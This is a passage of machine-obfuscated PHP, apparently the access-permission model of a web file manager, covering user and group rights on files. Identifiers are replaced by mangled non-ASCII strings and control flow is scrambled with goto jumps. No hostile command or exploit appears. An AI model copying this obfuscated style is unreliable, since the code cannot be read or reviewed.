SourceModel::TYPE_USER; } $Cî—Íàøë⁄[] = array($A¿á±»≥ï∞[397] => $cÃ∏ù∑Æí, $A¿á±»≥ï∞[406] => intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[406]]), $A¿á±»≥ï∞[498] => intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[498]]), $A¿á±»≥ï∞[1826] => intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[1826]]) ? intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[1826]]) : 0, $A¿á±»≥ï∞[1880] => intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[1880]]) ? intval($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[1880]]) : -1); } $this->where(array($A¿á±»≥ï∞[412] => $cÃ∏ù∑Æí))->delete(); $this->addAll($Cî—Íàøë⁄); goto EÙ◊◊∏îã•; c±‹ı∞Î¿†: if ($c“∑÷≠ÉÃä[$A¿á±»≥ï∞[406]] != SourceModel::TYPE_GROUP) { return !1; } $aªºÖ˘…á¯ = 1; $d§ŒıÌÇ∆¥ = $c“∑÷≠ÉÃä[$A¿á±»≥ï∞[498]]; goto DœŸÀÎ≠áË; aî…ê»—®“: } public function authClear($Cèµä·¨Óò) { $C—ƒΩÌªÆë =& $_SERVER[’ÿƒ†ïò]; $CÌÍõ≥ç“¢ = Model($C—ƒΩÌªÆë[1234])->sourceInfo($Cèµä·¨Óò); $eœäóÜıä· = array($Cèµä·¨Óò); if ($CÌÍõ≥ç“¢[$C—ƒΩÌªÆë[405]] == $C—ƒΩÌªÆë[87]) { $c’∂◊©‹ù· = array($C—ƒΩÌªÆë[578] => array($C—ƒΩÌªÆë[538], $CÌÍõ≥ç“¢[$C—ƒΩÌªÆë[515]] . $Cèµä·¨Óò . $C—ƒΩÌªÆë[539])); $eœäóÜıä· = Model($C—ƒΩÌªÆë[1234])->field($C—ƒΩÌªÆë[412])->where($c’∂◊©‹ù·)->getField($C—ƒΩÌªÆë[397], !0); $eœäóÜıä·[] = $Cèµä·¨Óò; } $this->where(array($C—ƒΩÌªÆë[412] => array($C—ƒΩÌªÆë[413], $eœäóÜıä·)))->delete(); return !0; } public function getAllChildren($AœÕ∑Ã·Ω£) { goto cøç√êâ«∂; F¢é»˘“·Ï: return $this->sourceListAuth($AÜûøàŸ≠ı); goto c·Ìäá◊Çè; EÂ‚—Õ„∞ï: $eôøÂ∞ºÕŸ = Model($DÜ¯òÃπ©Œ[820])->field($A∞Øªê≤â©)->where($F£èùóöÂò)->select(); $AÜûøàŸ≠ı = array($AœÕ∑Ã·Ω£); foreach ($eôøÂ∞ºÕŸ as $bû‹âÛπÃö) { foreach ($f√êõÆŒêº as $fÖ»ÈŸ®ÊÖ) { $dÒÍ£ÈÈûÃ = $DÜ¯òÃπ©Œ[47] . $fÖ»ÈŸ®ÊÖ . $DÜ¯òÃπ©Œ[47]; $Bˆ§€î∆ıÆ = $bû‹âÛπÃö[$DÜ¯òÃπ©Œ[515]] . $bû‹âÛπÃö[$DÜ¯òÃπ©Œ[397]] . $DÜ¯òÃπ©Œ[47]; if (strstr($Bˆ§€î∆ıÆ, $dÒÍ£ÈÈûÃ)) { $AÜûøàŸ≠ı[] = $bû‹âÛπÃö[$DÜ¯òÃπ©Œ[397]]; break; } } } goto F¢é»˘“·Ï; cøç√êâ«∂: $DÜ¯òÃπ©Œ =& $_SERVER[’ÿƒ†ïò]; $Fõ¶ ÖÉ≠õ = Model($DÜ¯òÃπ©Œ[1234])->sourceInfo($AœÕ∑Ã·Ω£); if ($Fõ¶ ÖÉ≠õ[$DÜ¯òÃπ©Œ[405]] != $DÜ¯òÃπ©Œ[87]) { return $this->sourceListAuth(array($AœÕ∑Ã·Ω£)); } goto AΩæÖî≠Ÿ; b∏µÁ≥ÂàÊ: if ($Fõ¶ ÖÉ≠õ[$DÜ¯òÃπ©Œ[492]] == $DÜ¯òÃπ©Œ[191] && $Fõ¶ ÖÉ≠õ[$DÜ¯òÃπ©Œ[498]] != $A≤ê˜“äé‚) { $f√êõÆŒêº = $this->groupChidldAllRootSource($Fõ¶ ÖÉ≠õ[$DÜ¯òÃπ©Œ[498]]); } $D£πÓ‰ÈëÚ = $this->field($DÜ¯òÃπ©Œ[397])->group($DÜ¯òÃπ©Œ[397])->select(); $D£πÓ‰ÈëÚ = array_to_keyvalue($D£πÓ‰ÈëÚ, $DÜ¯òÃπ©Œ[33], $DÜ¯òÃπ©Œ[397]); goto B®òÍìƒ©Ω; AΩæÖî≠Ÿ: if ($Fõ¶ ÖÉ≠õ[$DÜ¯òÃπ©Œ[406]] != SourceModel::TYPE_GROUP) { return array(); } $A≤ê˜“äé‚ = 1; $f√êõÆŒêº = array($AœÕ∑Ã·Ω£); goto b∏µÁ≥ÂàÊ; B®òÍìƒ©Ω: if (!$D£πÓ‰ÈëÚ) { return array(); } $A∞Øªê≤â© = $DÜ¯òÃπ©Œ[1899]; $F£èùóöÂò = array($DÜ¯òÃπ©Œ[397] => array($DÜ¯òÃπ©Œ[7], $D£πÓ‰ÈëÚ), $DÜ¯òÃπ©Œ[425] => $DÜ¯òÃπ©Œ[191]); goto EÂ‚—Õ„∞ï; c·Ìäá◊Çè: } private function sourceListAuth($Aå¨∞∞èˆ) { goto dƒÂëÓÕﬁò; DŒ¬›Ñ◊ü¡: array_multisort($düá—íŒÁà, SORT_ASC, $aÈê ãÕí´); return $aÈê ãÕí´; goto AÈã±éñΩï; AÚéπ√ûÇŸ: $aÈê ãÕí´ = array(); $düá—íŒÁà = array(); foreach ($a«ÑïÏë„ù as $cï∑⁄òÀŒá) { goto eÜã∂åø¶≈; FŸˆÉ‡ù¶ü: $cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[1900]] = $this->authTargetInfo($fì˜êˆÜ∞∞); $cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[513]] = rtrim($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[519]], $E◊Ö¿äÚíÛ[8]) . $E◊Ö¿äÚíÛ[8] . ltrim($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[513]], $E◊Ö¿äÚíÛ[8]); $aÈê ãÕí´[] = $cï∑⁄òÀŒá; goto Fû⁄ºÛÉàá; Fû⁄ºÛÉàá: $eÂìâà∑ç… = count(explode($E◊Ö¿äÚíÛ[8], trim($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[513]], $E◊Ö¿äÚíÛ[8]))); $düá—íŒÁà[] = $eÂìâà∑ç… + ($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[29]] == $E◊Ö¿äÚíÛ[77] ? 0 : 1000); goto e‹è‚È≠æ‰; eÜã∂åø¶≈: unset($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[448]]); unset($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[446]]); unset($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[408]]); goto e≥Çô’ﬁÌ; e≥Çô’ﬁÌ: unset($cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[85]]); $fì˜êˆÜ∞∞ = $F›√ëÃ…Ö [$cï∑⁄òÀŒá[$E◊Ö¿äÚíÛ[397]]]; if (!$fì˜êˆÜ∞∞) { continue; } goto FŸˆÉ‡ù¶ü; e‹è‚È≠æ‰: } goto DŒ¬›Ñ◊ü¡; dƒÂëÓÕﬁò: $E◊Ö¿äÚíÛ =& $_SERVER[’ÿƒ†ïò]; $a«ÑïÏë„ù = Model($E◊Ö¿äÚíÛ[1234])->sourceListInfo($Aå¨∞∞èˆ, !0); $F›√ëÃ…Ö  = $this->sourceAuthSelect($Aå¨∞∞èˆ); goto AÚéπ√ûÇŸ; AÈã±éñΩï: } private function groupChidldAllRootSource($FÓ·ÑÉΩÜ°) { $c¢Êõ›É©Ó =& $_SERVER[’ÿƒ†ïò]; $cÁÚö¢Ì“ = Model($c¢Êõ›É©Ó[1901])->groupChildrenAll($FÓ·ÑÉΩÜ°); $dÇ£ﬂ¨™Ü⁄ = array($c¢Êõ›É©Ó[492] => 0, $c¢Êõ›É©Ó[498] => array($c¢Êõ›É©Ó[7], $cÁÚö¢Ì“), $c¢Êõ›É©Ó[406] => SourceModel::TYPE_GROUP); $fß·Ï˘ıü¢ = Model($c¢Êõ›É©Ó[820])->field($c¢Êõ›É©Ó[397])->where($dÇ£ﬂ¨™Ü⁄)->select(); $fß·Ï˘ıü¢ = array_to_keyvalue($fß·Ï˘ıü¢, $c¢Êõ›É©Ó[33], $c¢Êõ›É©Ó[397]); return $fß·Ï˘ıü¢; } private function authTargetInfo($AƒÙ•ﬂ»àÇ) { goto aÙ—◊£ÜÖ¯; Aèù•©€Âß: return $aÑ°ºıõ£‡; goto AæØ⁄éù⁄à; B∞Ñ‹úïçª: $BÉáÆÜπ˘Õ = 2 << 25; foreach ($AƒÙ•ﬂ»àÇ as $aß∆Âã—œ˜) { goto bÇçŒŒ´·ô; b”ßÑã±ÿı: if (!$FåÛ™á¥∏Ø) { continue; } $FåÛ™á¥∏Ø[$Cπ›¢ã∫ËΩ[460]] = $B®äﬁÀò∑√; $aÑ°ºıõ£‡[] = $FåÛ™á¥∏Ø; goto c˘¶˜ü„ã„; bÇçŒŒ´·ô: $B®äﬁÀò∑√ = Model($Cπ›¢ã∫ËΩ[501])->listData($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[1826]]); if (!$B®äﬁÀò∑√) { continue; } if ($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[406]] == SourceModel::TYPE_USER) { $FåÛ™á¥∏Ø = Model($Cπ›¢ã∫ËΩ[507])->getInfoSimpleOuter($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[498]]); if ($FåÛ™á¥∏Ø[$Cπ›¢ã∫ËΩ[1557]] == $Cπ›¢ã∫ËΩ[1113]) { continue; } if ($FåÛ™á¥∏Ø[$Cπ›¢ã∫ËΩ[1557]] == $Cπ›¢ã∫ËΩ[191]) { $FåÛ™á¥∏Ø[$Cπ›¢ã∫ËΩ[28]] = LNG($Cπ›¢ã∫ËΩ[1902]); } } else { $FåÛ™á¥∏Ø = Model($Cπ›¢ã∫ËΩ[516])->getInfoSimple($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[498]]); } goto b”ßÑã±ÿı; c˘¶˜ü„ã„: $e›≈€Ïô¯‡ = 0; if ($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[406]] == SourceModel::TYPE_GROUP) { $e›≈€Ïô¯‡ = $BÉáÆÜπ˘Õ * 2; } if ($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[406]] == SourceModel::TYPE_USER) { $e›≈€Ïô¯‡ = $BÉáÆÜπ˘Õ; } goto D¨®¥≈€◊Ì; D¨®¥≈€◊Ì: if ($aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[406]] == SourceModel::TYPE_USER && $aß∆Âã—œ˜[$Cπ›¢ã∫ËΩ[498]] == $Cπ›¢ã∫ËΩ[191]) { $e›≈€Ïô¯‡ = 0; } $aÜãŒõ⁄·ˆ[] = $B®äﬁÀò∑√[$Cπ›¢ã∫ËΩ[408]] + $e›≈€Ïô¯‡; goto b¶·£±ıàÿ; b¶·£±ıàÿ: } array_multisort($aÜãŒõ⁄·ˆ, SORT_DESC, $aÑ°ºıõ£‡); goto Aèù•©€Âß; aÙ—◊£ÜÖ¯: $Cπ›¢ã∫ËΩ =& $_SERVER[’ÿƒ†ïò]; $aÑ°ºıõ£‡ = array(); $aÜãŒõ⁄·ˆ = array(); goto B∞Ñ‹úïçª; AæØ⁄éù⁄à: } public function getAllChildrenByUser($FÈÁëö—é®, $c∆–ÚõÇ´í) { goto AÚÿÙ∫ÇÚ‚; E°‚‚Û„Úº: $Cçò’…â Ω = Model($BÚØ·Ö—õô[1234])->sourceInfo($FÈÁëö—é®); $Dàé◊≈„áÇ = array(); $Aí†éﬁÚ⁄– = 1; goto Câø–ôˆÇº; Câø–ôˆÇº: if ($Cçò’…â Ω[$BÚØ·Ö—õô[492]] == $BÚØ·Ö—õô[191] && $Cçò’…â Ω[$BÚØ·Ö—õô[498]] != $Aí†éﬁÚ⁄– && $this->groupContainUser($Cçò’…â Ω[$BÚØ·Ö—õô[498]], $c∆–ÚõÇ´í)) { foreach ($fÉòçç˜ì≠[$BÚØ·Ö—õô[1903]] as $f‡◊ªÚòΩÊ) { $dÜîñﬂ˜ë¬ = Model($BÚØ·Ö—õô[516])->getInfo($f‡◊ªÚòΩÊ[$BÚØ·Ö—õô[1726]]); $Dª–Ó¥ ÇÊ = Model($BÚØ·Ö—õô[532])->getInfoSimpleOuter($c∆–ÚõÇ´í); $Dª–Ó¥ ÇÊ[$BÚØ·Ö—õô[460]] = $f‡◊ªÚòΩÊ[$BÚØ·Ö—õô[408]]; if (Model($BÚØ·Ö—õô[501])->authCheckAction($f‡◊ªÚòΩÊ[$BÚØ·Ö—õô[408]][$BÚØ·Ö—õô[408]], $BÚØ·Ö—õô[1746])) { continue; } $f≤áÜ¥ÒπÉ = array($BÚØ·Ö—õô[28] => $BÚØ·Ö—õô[1509] . $dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[28]], $BÚØ·Ö—õô[397] => $dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[85]][$BÚØ·Ö—õô[397]], $BÚØ·Ö—õô[76] => KodIO::make($dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[85]][$BÚØ·Ö—õô[397]]), $BÚØ·Ö—õô[492] => $BÚØ·Ö—õô[191], $BÚØ·Ö—õô[406] => $BÚØ·Ö—õô[509], $BÚØ·Ö—õô[29] => $BÚØ·Ö—õô[542], $BÚØ·Ö—õô[513] => $dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[520]], $BÚØ·Ö—õô[1726] => $dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[1726]], $BÚØ·Ö—õô[517] => $dÜîñﬂ˜ë¬[$BÚØ·Ö—õô[492]], $BÚØ·Ö—õô[1900] => array($Dª–Ó¥ ÇÊ)); $Dàé◊≈„áÇ[$f≤áÜ¥ÒπÉ[$BÚØ·Ö—õô[397]]] = $f≤áÜ¥ÒπÉ; } } $eÜı„—Ø™ñ = array(); $B“éÓ¨≈‡∏ = $this->getAllChildren($FÈÁëö—é®); goto Bª⁄÷ûä˘÷; D‡çº±«≠µ: return $eÜı„—Ø™ñ; goto eÒ“ÿ∑◊ŸÀ; Bª⁄÷ûä˘÷: foreach ($B“éÓ¨≈‡∏ as $fŸ¥√á·¨•) { $B§≥ãﬁ£÷« = !1; foreach ($fŸ¥√á·¨•[$BÚØ·Ö—õô[1900]] as $FÏ—Ëº†“Ç) { if ($FÏ—Ëº†“Ç[$BÚØ·Ö—õô[1557]]) { if ($FÏ—Ëº†“Ç[$BÚØ·Ö—õô[1557]] == $c∆–ÚõÇ´í) { $B§≥ãﬁ£÷« = !0; break; } } if ($FÏ—Ëº†“Ç[$BÚØ·Ö—õô[1726]]) { if ($this->groupContainUser($FÏ—Ëº†“Ç[$BÚØ·Ö—õô[1726]], $c∆–ÚõÇ´í)) { $B§≥ãﬁ£÷« = !0; break; } } } if ($B§≥ãﬁ£÷«) { $eÜı„—Ø™ñ[] = $fŸ¥√á·¨•; } $DæÇ±ÔæÜñ = $fŸ¥√á·¨•[$BÚØ·Ö—õô[397]]; if (isset($Dàé◊≈„áÇ[$DæÇ±ÔæÜñ])) { $fŸ¥√á·¨•[$BÚØ·Ö—õô[1900]][] = $Dàé◊≈„áÇ[$DæÇ±ÔæÜñ][0]; $Dàé◊≈„áÇ[$DæÇ±ÔæÜñ] = !1; } } $Dàé◊≈„áÇ = array_filter(array_values($Dàé◊≈„áÇ)); $eÜı„—Ø™ñ = array_merge($Dàé◊≈„áÇ, $eÜı„—Ø™ñ); goto D‡çº±«≠µ; AÚÿÙ∫ÇÚ‚: $BÚØ·Ö—õô =& $_SERVER[’ÿƒ†ïò]; $fÉòçç˜ì≠ = Model($BÚØ·Ö—õô[532])->getInfo($c∆–ÚõÇ´í); if (!$c∆–ÚõÇ´í || !$FÈÁëö—é® || !$fÉòçç˜ì≠) { return array(); } goto E°‚‚Û„Úº; eÒ“ÿ∑◊ŸÀ: } public function setAllChildrenByUser($b‡â§áÿ ‘, $c∑‰∞≠’∑≠, $Fµ±≠∫êïõ) { $f‡Õ¨åàÏå =& $_SERVER[’ÿƒ†ïò]; $AìÏÍ—¿·« = $this->getAllChildrenByUser($b‡â§áÿ ‘, $c∑‰∞≠’∑≠); if (!$Fµ±≠∫êïõ || !$AìÏÍ—¿·«) { return !1; } foreach ($AìÏÍ—¿·« as $BØÿãàÃ†◊) { $BÁé∑è◊∏È = array(); foreach ($BØÿãàÃ†◊[$f‡Õ¨åàÏå[1900]] as $dÉ“≠†Ïä) { $c≥ÌÒˆªÎÏ = $dÉ“≠†Ïä[$f‡Õ¨åàÏå[460]]; $c≈äﬁ“üﬂø = $dÉ“≠†Ïä[$f‡Õ¨åàÏå[1557]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $F«—‰£ûâÏ = $dÉ“≠†Ïä[$f‡Õ¨åàÏå[1557]] ? $dÉ“≠†Ïä[$f‡Õ¨åàÏå[1557]] : $dÉ“≠†Ïä[$f‡Õ¨åàÏå[1726]]; if ($dÉ“≠†Ïä[$f‡Õ¨åàÏå[1557]] && $dÉ“≠†Ïä[$f‡Õ¨åàÏå[1557]] == $c∑‰∞≠’∑≠) { continue; } $BÁé∑è◊∏È[] = array($f‡Õ¨åàÏå[397] => $BØÿãàÃ†◊[$f‡Õ¨åàÏå[397]], $f‡Õ¨åàÏå[406] => $c≈äﬁ“üﬂø, $f‡Õ¨åàÏå[498] => intval($F«—‰£ûâÏ), $f‡Õ¨åàÏå[1826] => isset($c≥ÌÒˆªÎÏ[$f‡Õ¨åàÏå[395]]) ? intval($c≥ÌÒˆªÎÏ[$f‡Õ¨åàÏå[395]]) : 0, $f‡Õ¨åàÏå[1880] => isset($c≥ÌÒˆªÎÏ[$f‡Õ¨åàÏå[1880]]) ? intval($c≥ÌÒˆªÎÏ[$f‡Õ¨åàÏå[1880]]) : -1); } $BÁé∑è◊∏È[] = array($f‡Õ¨åàÏå[397] => $BØÿãàÃ†◊[$f‡Õ¨åàÏå[397]], $f‡Õ¨åàÏå[406] => SourceModel::TYPE_USER, $f‡Õ¨åàÏå[498] => intval($c∑‰∞≠’∑≠), $f‡Õ¨åàÏå[1826] => intval($Fµ±≠∫êïõ), $f‡Õ¨åàÏå[1880] => -1); $this->where(array($f‡Õ¨åàÏå[412] => $BØÿãàÃ†◊[$f‡Õ¨åàÏå[397]]))->delete(); $this->addAll($BÁé∑è◊∏È); } return !0; } public function get($EÏ–∫œàﬂÀ) { $E◊¿ªµöœ… = $this->getSourceList(array($EÏ–∫œàﬂÀ), !0); return $E◊¿ªµöœ…[0]; } public function getSourceList($BÎÚ–æÃèè, $e’ƒö°Îö∏ = false, $b¨ê±ºâúÊ = false) { goto Bπ∏∂ Õõë; C‘œëÍÜ∆‘: $cë≤©¶Ÿí» = $this->sourceAuthSelect($a›Ë¬Æì–à); $fÂÂé–À‹⁄ = array(); foreach ($a›Ë¬Æì–à as $Eîìã§–£µ) { if (isset($cë≤©¶Ÿí»[$Eîìã§–£µ])) { $fÂÂé–À‹⁄[$Eîìã§–£µ] = $cë≤©¶Ÿí»[$Eîìã§–£µ]; } } goto cüö√¯†©¡; E»üÜ…ëÑ’: if (!$e’ƒö°Îö∏ && count($BÎÚ–æÃèè) == 1) { $e’ƒö°Îö∏ = array(); $e’ƒö°Îö∏[$BÎÚ–æÃèè[0]] = $bÎ´ùèãÊ∏->sourceInfo($BÎÚ–æÃèè[0]); } if (!$e’ƒö°Îö∏) { $cæ§Ç√õÎç = array($EÌ€‰ˆç·¢[412] => array($EÌ€‰ˆç·¢[413], $BÎÚ–æÃèè)); $e’ƒö°Îö∏ = $bÎ´ùèãÊ∏->field($EÌ€‰ˆç·¢[1904])->where($cæ§Ç√õÎç)->select(); $e’ƒö°Îö∏ = array_to_keyvalue($e’ƒö°Îö∏, $EÌ€‰ˆç·¢[397]); } $a›Ë¬Æì–à = $BÎÚ–æÃèè; goto aÜ∏®˘«≥; cüö√¯†©¡: $cÈπÚáµÜÙ = $this->userIsRoot($b¨ê±ºâúÊ); $Fê≠ç≥´–… = AuthModel::authAll(); $a™¨⁄éÁ⁄ = array($EÌ€‰ˆç·¢[409] => $Fê≠ç≥´–…, $EÌ€‰ˆç·¢[1905] => array($EÌ€‰ˆç·¢[414] => 0, $EÌ€‰ˆç·¢[1732] => $Fê≠ç≥´–…, $EÌ€‰ˆç·¢[415] => LNG($EÌ€‰ˆç·¢[1906]), $EÌ€‰ˆç·¢[1748] => $EÌ€‰ˆç·¢[1907])); goto a’¥¨øäàë; Bπ∏∂ Õõë: $EÌ€‰ˆç·¢ =& $_SERVER[’ÿƒ†ïò]; if (!$BÎÚ–æÃèè) { return array(); } $bÎ´ùèãÊ∏ = Model($EÌ€‰ˆç·¢[1234]); goto E»üÜ…ëÑ’; a’¥¨øäàë: $Eòåà° ´¢ = array(); foreach ($e’ƒö°Îö∏ as $Eîìã§–£µ => $fèÑ®ÛÉùÊ) { if ($cÈπÚáµÜÙ) { $Eòåà° ´¢[$Eîìã§–£µ] = $a™¨⁄éÁ⁄; continue; } $Eòåà° ´¢[$Eîìã§–£µ] = $this->makeSourceAuth($fèÑ®ÛÉùÊ, $fÂÂé–À‹⁄, $b¨ê±ºâúÊ); } return $Eòåà° ´¢; goto A‹ïÕïø ; aÜ∏®˘«≥: foreach ($e’ƒö°Îö∏ as $DÂÈûü»ÇÖ => $b‚ƒÜñµ√ ) { $d»∏ù•‰ãÿ = $bÎ´ùèãÊ∏->parentLevelArray($b‚ƒÜñµ√ [$EÌ€‰ˆç·¢[515]]); $a›Ë¬Æì–à = array_merge($a›Ë¬Æì–à, array($DÂÈûü»ÇÖ), array_reverse($d»∏ù•‰ãÿ)); } $a›Ë¬Æì–à = array_values(array_unique($a›Ë¬Æì–à)); if (!$a›Ë¬Æì–à) { return array(); } goto C‘œëÍÜ∆‘; A‹ïÕïø : } public function authDeepCheck($eè âó öÃ, $Dá¢¨†óÂã = false) { goto aÕªΩÕıı¨; AÚ»ìßï÷∞: if (!in_array($eè âó öÃ, $fΩëÛ⁄™¢Ω[$d–’Œπù˜√[1908]])) { return !1; } $F·∆á¯⁄Ûø = array(); foreach ($fΩëÛ⁄™¢Ω[$d–’Œπù˜√[1909]] as $dÑœ–ñ™≈ë => $C≥∏Îõ≈Ò) { if (!in_array($eè âó öÃ, $C≥∏Îõ≈Ò)) { continue; } $F·∆á¯⁄Ûø[] = $dÑœ–ñ™≈ë; } goto AÇ∑‹ú≠’à; AÇ∑‹ú≠’à: if (!$F·∆á¯⁄Ûø) { return !1; } $bÑ≈éºôÑ∂ = $F·∆á¯⁄Ûø ? $F·∆á¯⁄Ûø[0] : $eè âó öÃ; return array($d–’Œπù˜√[409] => -1, $d–’Œπù˜√[460] => array($d–’Œπù˜√[414] => $d–’Œπù˜√[1113], $d–’Œπù˜√[1732] => $d–’Œπù˜√[191], $d–’Œπù˜√[415] => LNG($d–’Œπù˜√[1910]), $d–’Œπù˜√[1748] => $d–’Œπù˜√[1911]), $d–’Œπù˜√[1912] => LNG($d–’Œπù˜√[1913]), $d–’Œπù˜√[1914] => $this->sourceAuthInfo($bÑ≈éºôÑ∂)); goto c»˜Êöíé©; aÕªΩÕıı¨: $d–’Œπù˜√ =& $_SERVER[’ÿƒ†ïò]; $Dá¢¨†óÂã = $Dá¢¨†óÂã ? $Dá¢¨†óÂã : USER_ID; $fΩëÛ⁄™¢Ω = $this->makeAuthDeep($Dá¢¨†óÂã); goto AÚ»ìßï÷∞; c»˜Êöíé©: } protected function makeAuthDeep($cçÛöØ•‚à = false) { goto c†øœ“ó…; bŒ˘âÍÈì≈: $dº∑≥Á§ƒâ = $E•Ÿê»”ê–; foreach ($dº∑≥Á§ƒâ as $fÓ‡ı‰Ìª ) { $Cåâ»ôçﬁÈ = $bÔÑÕÜÒãü->getInfo($fÓ‡ı‰Ìª ); $eàÀ€›¬≥© = $a„ã¬ÜÌ∞ú->parentLevelArray($Cåâ»ôçﬁÈ[$A˜∏îëªŒ´[515]]); $E•Ÿê»”ê– = array_merge($E•Ÿê»”ê–, $eàÀ€›¬≥©); } $E•Ÿê»”ê– = array_values(array_unique($E•Ÿê»”ê–)); goto dŒª™Ê¶Ëâ; D—§¯æÚÁÌ: foreach ($fÑòñ·™÷â as $AπåéÉåïê) { if ($AπåéÉåïê[$A˜∏îëªŒ´[408]] == 0 && $AπåéÉåïê[$A˜∏îëªŒ´[1747]] == $A˜∏îëªŒ´[87]) { $e«è”Ÿ«¶¥[] = $AπåéÉåïê[$A˜∏îëªŒ´[395]]; } } $f≤ãûß»úÂ = $this->userGroupParents($cçÛöØ•‚à); $Fº¡µπÙ˘« = array($A˜∏îëªŒ´[406] => SourceModel::TYPE_USER, $A˜∏îëªŒ´[498] => $cçÛöØ•‚à); goto C√ó∆™˘óÜ; c†øœ“ó…: $A˜∏îëªŒ´ =& $_SERVER[’ÿƒ†ïò]; static $e‚øÉÌÔ†ú = array(); $cçÛöØ•‚à = $cçÛöØ•‚à ? $cçÛöØ•‚à : USER_ID; goto fßº‹òÃﬂï; Aì´◊õ˜¢Ï: $E•Ÿê»”ê– = $f≤ãûß»úÂ; $a„ã¬ÜÌ∞ú = Model($A˜∏îëªŒ´[1234]); $bÔÑÕÜÒãü = Model($A˜∏îëªŒ´[516]); goto dÜòèıœíì; C√ó∆™˘óÜ: if ($f≤ãûß»úÂ) { $Fº¡µπÙ˘« = array(array($A˜∏îëªŒ´[406] => SourceModel::TYPE_USER, $A˜∏îëªŒ´[498] => $cçÛöØ•‚à), array($A˜∏îëªŒ´[406] => SourceModel::TYPE_GROUP, $A˜∏îëªŒ´[498] => array($A˜∏îëªŒ´[413], $f≤ãûß»úÂ)), $A˜∏îëªŒ´[987] => $A˜∏îëªŒ´[1818]); } $eóâÏòô∂Ù = $this->field($A˜∏îëªŒ´[1916])->where($Fº¡µπÙ˘«)->select(); $e ¢ë∂˘ùã = array(); goto F÷ÓÊÿ“Ÿ⁄; dÜòèıœíì: $f£®◊Ûº∂≥ = array(); $DãªŒıôæŒ = array(); $bèèÿä‰Àƒ = array(); goto C∑Ìõ èÍÃ; F÷ÓÊÿ“Ÿ⁄: $bÂ±‰ ìé© = array_to_keyvalue_group($eóâÏòô∂Ù, $A˜∏îëªŒ´[397]); foreach ($bÂ±‰ ìé© as $c§ÃŸçè–Ÿ => $EØâ¨¯ÖÈ√) { $a¨èÈÊÜÍÍ = $this->authArrayCheck($EØâ¨¯ÖÈ√, $cçÛöØ•‚à); if ($a¨èÈÊÜÍÍ[$A˜∏îëªŒ´[409]] > 0) { $e ¢ë∂˘ùã[] = $c§ÃŸçè–Ÿ . $A˜∏îëªŒ´[33]; } } $EÍê«óøØö = array(); goto Aì´◊õ˜¢Ï; fÆ‹ŒÍΩ¯•: $Dé‡ª¯Üúó = array($A˜∏îëªŒ´[1908] => $EÍê«óøØö, $A˜∏îëªŒ´[1909] => $f£®◊Ûº∂≥); $e‚øÉÌÔ†ú[$cçÛöØ•‚à] = $Dé‡ª¯Üúó; return $Dé‡ª¯Üúó; goto e∏ûñ‘î“ù; dŒª™Ê¶Ëâ: foreach ($E•Ÿê»”ê– as $fÓ‡ı‰Ìª ) { $Cåâ»ôçﬁÈ = $bÔÑÕÜÒãü->getInfo($fÓ‡ı‰Ìª ); $EÍê«óøØö[] = $Cåâ»ôçﬁÈ[$A˜∏îëªŒ´[85]][$A˜∏îëªŒ´[397]]; $bèèÿä‰Àƒ[$fÓ‡ı‰Ìª ] = $Cåâ»ôçﬁÈ[$A˜∏îëªŒ´[85]][$A˜∏îëªŒ´[397]]; $c√çéå⁄‘Ù[$fÓ‡ı‰Ìª ] = $a„ã¬ÜÌ∞ú->parentLevelArray($Cåâ»ôçﬁÈ[$A˜∏îëªŒ´[515]]); } foreach ($f£®◊Ûº∂≥ as $A∆ÎÁäœóø => $bæÀÇª—Öè) { $Cˆ´ÏΩ⁄°à = $DãªŒıôæŒ[$A∆ÎÁäœóø]; if (!$Cˆ´ÏΩ⁄°à || !$bèèÿä‰Àƒ[$Cˆ´ÏΩ⁄°à]) { continue; } $c£‡¨§¢∏È = array(); foreach ($c√çéå⁄‘Ù[$Cˆ´ÏΩ⁄°à] as $fÓ‡ı‰Ìª ) { $c£‡¨§¢∏È[] = $bèèÿä‰Àƒ[$fÓ‡ı‰Ìª ]; } $f£®◊Ûº∂≥[$A∆ÎÁäœóø] = array_merge($c£‡¨§¢∏È, $bæÀÇª—Öè); } $EÍê«óøØö = array_values(array_unique($EÍê«óøØö)); goto fÆ‹ŒÍΩ¯•; C∑Ìõ èÍÃ: $c√çéå⁄‘Ù = array(); if ($e ¢ë∂˘ùã) { $b≠ êÏ¢Ú÷ = $a„ã¬ÜÌ∞ú->where(array($A˜∏îëªŒ´[397] => array($A˜∏îëªŒ´[413], $e ¢ë∂˘ùã)))->select(); foreach ($b≠ êÏ¢Ú÷ as $böÂ˜ªÁ¿œ) { $eàÀ€›¬≥© = $a„ã¬ÜÌ∞ú->parentLevelArray($böÂ˜ªÁ¿œ[$A˜∏îëªŒ´[515]]); $EÍê«óøØö = array_merge($EÍê«óøØö, $eàÀ€›¬≥©); $E•Ÿê»”ê–[] = $böÂ˜ªÁ¿œ[$A˜∏îëªŒ´[498]]; $f£®◊Ûº∂≥[$böÂ˜ªÁ¿œ[$A˜∏îëªŒ´[397]]] = $eàÀ€›¬≥©; 